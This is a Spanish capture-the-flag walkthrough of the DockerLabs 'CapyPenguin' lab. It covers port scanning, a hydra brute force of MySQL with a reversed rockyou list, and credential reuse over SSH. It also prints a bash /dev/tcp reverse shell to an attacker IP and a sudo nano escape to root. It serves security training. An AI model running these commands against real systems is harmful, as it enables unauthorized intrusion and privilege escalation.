# Máquina CapyPenguin

---------------------

Dificultad -> Easy

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
3306/tcp open  mysql   syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p80 172.17.0.2 -oN targeted
________________________________________________
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9e6a3f89de9d05d99432738d31e0a5eb (ECDSA)
|_  256 e7ef4f4a2586c955b0880a8c7903d09f (ED25519)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Web de Capybaras
3306/tcp open  mysql   MySQL 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
```

Vemos algo más de información sobre los servicios. Vemos la versión de SSH, la de Apache, y algo de información extra sobre la base de datos MySQL que corre como en la mayoría de casos por defecto en el puerto 3306.

Inspeccionaremos la página web que corre por el puerto 80:

![Pasted image 20240413135355](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/45e62bc6-8d09-43b8-9428-f9a37ec4c214)


_"**Hola capybarauser, esta es una web de capybaras. He securizado mi password, ya no se encuentra al comienzo del rockyou..., espero que nadie use el comando tac y se fije en las últimas passwords del rockyou**"_

Nos dan una pista, y es que la contraseña de **"capybarauser"** se encuentra al final del famoso diccionario **rockyou**. El comando **tac** que se menciona, permite leer y mostrar el contenido de un archivo en orden inverso. De forma que le aplicamos este comando al **rockyou** y almacenamos el resultado en un nuevo fichero que llamaré "**MiRockYou.txt**" para poder usarlo como diccionario en un ataque de fuerza bruta.

```shell
tac /usr/share/wordlists/rockyou.txt > MiRockYou.txt
```

--------------

## Explotación

Tenemos que tener cuidado con las primeras líneas del nuevo diccionario, que están corruptas, quitamos los caracteres extraños y continuamos con la fuerza bruta.
Con este nuevo diccionario realizaremos un ataque de fuerza bruta contra el puerto **3306** donde corre el servicio **MySQL**.. Lo haremos con la herramienta **hydra**.

```shell
hydra -l capybarauser -P MiRockYou.txt mysql://172.17.0.2 -t 4
----------------------------------------------------------------
[DATA] attacking mysql://172.17.0.2:3306/
[3306][mysql] host: 172.17.0.2   login: capybarauser   password: ie168
1 of 1 target successfully completed, 1 valid password found
```

Encontramos credenciales para el usuario **capybarauser:ie168**

Accedemos a la base de datos con las nuevas credenciales:

```shell
mysql -h 172.17.0.2 -P 3306 -u capybarauser -p
(ponemos la contraseña ie168)
```

Enumeraremos un poco la base de datos.

```sql
MariaDB [(none)]> SHOW DATABASES;
------------------------------------
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| pinguinasio_db     |
| sys                |
+--------------------+
```

```sql
USE pinguinasio_db;
SHOW TABLES;
-------------------------------
+--------------------------+
| Tables_in_pinguinasio_db |
+--------------------------+
| users                    |
+--------------------------+
1 row in set (0,001 sec)
```

```sql
SELECT * FROM users;
------------------------------
+----+-------+------------------+
| id | user  | password         |
+----+-------+------------------+
|  1 | mario | pinguinomolon123 |
+----+-------+------------------+
1 row in set (0,001 sec)
```

Encontramos un usuario y su contraseña: "**mario:pinguinomolon123**"
Trataremos de entrar por **SSH**.

```shell
ssh mario@172.17.0.2
```

Estamos dentro !

------------------------------
### Tratamiento de la tty

Si tenemos problemas al aplicar el tratamiento de la **tty**, lo que podemos hacer es ponernos en escucha desde una consola nueva por un puerto. Por ejemplo con **netcat**

```shell
nc -nlvp 443
```

Y nos enviamos desde la máquina víctima una reverse shell para acceder:

```shell
bash -c "bash -i >&/dev/tcp/192.168.1.37/443 0>&1" 
```

(Siendo la 192.168.1.37 mi IP de la máquina atacante)

---------------

Realizaremos un breve **tratamiento de la tty** para poder operar de forma cómoda sobre la consola. Los comandos a ejecutar:

```shell
script /dev/null -c bash 
```
(hacemos  **ctrl  +  Z**)

```shell
stty raw -echo; fg
reset xterm
stty rows 62 columns 248
export TERM=xterm
export SHELL=bash
```

Pondremos en rows y columns las columnas y filas que correspondan a la pantalla de nuestra máquina.
Una vez hecho esto podemos maniobrar con comodidad, pudiendo hacer Ctrl+L para limpiar la pantalla así como Ctrl+C.

------------
## Escalada de privilegios

Hacemos un **sudo -l** para ver si podemos ejecutar algo con privilegios de otro usuario o de root.

```shell
sudo -l
------------------
(ALL : ALL) NOPASSWD: /usr/bin/nano
```

Podemos ejecutar **nano**. Esto es crítico y podemos abusar de este para ejecutar una consola como el usuario root. Si no sabemos como, siempre podemos consultar [GTFOBins](https://gtfobins.github.io/)

```shell
sudo nano
^R^X (Ctrl+R y Ctrl+X)
reset; sh 1>&0 2>&0
```

![Pasted image 20240415220430](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/0c76c1a8-1d89-46c3-bc06-2aafe6c7b515)

Podemos hacer un **clear** para quitar el **nano** y ver bien la consola:

```shell
clear
whoami
----------------
root
```
